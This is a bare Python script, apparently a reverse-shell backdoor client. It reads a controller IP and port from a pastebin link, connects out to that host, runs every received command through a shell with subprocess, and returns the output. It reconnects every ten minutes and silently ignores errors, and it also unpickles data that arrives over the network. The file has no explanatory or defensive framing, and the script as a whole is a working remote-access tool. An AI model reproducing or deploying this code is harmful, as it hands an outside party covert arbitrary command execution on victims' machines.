import socket
import pickle
import subprocess
import time
import requests


def send_data(conn, data):
    data = pickle.dumps(data)
    data_len_str = str(len(data))
    header = '0' * (64 - len(data_len_str)) + data_len_str

    conn.send(header.encode())
    conn.send(data)


def recv_data(conn):
    header = conn.recv(64)
    return pickle.loads(conn.recv(int(header)))


while True:
    try:
        host = requests.get('https://pastebin.com/raw/AHDwWDaF').text.split(':')
        ip, port = host[0], int(host[1])

        s = socket.socket()

        s.connect((ip, port))

        while True:
            command = recv_data(s)
            if command == 'bye!': break
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read().decode()
            output_error = op.stderr.read().decode()
            send_data(s, output + output_error)

        s.close()
    except:
        time.sleep(600)
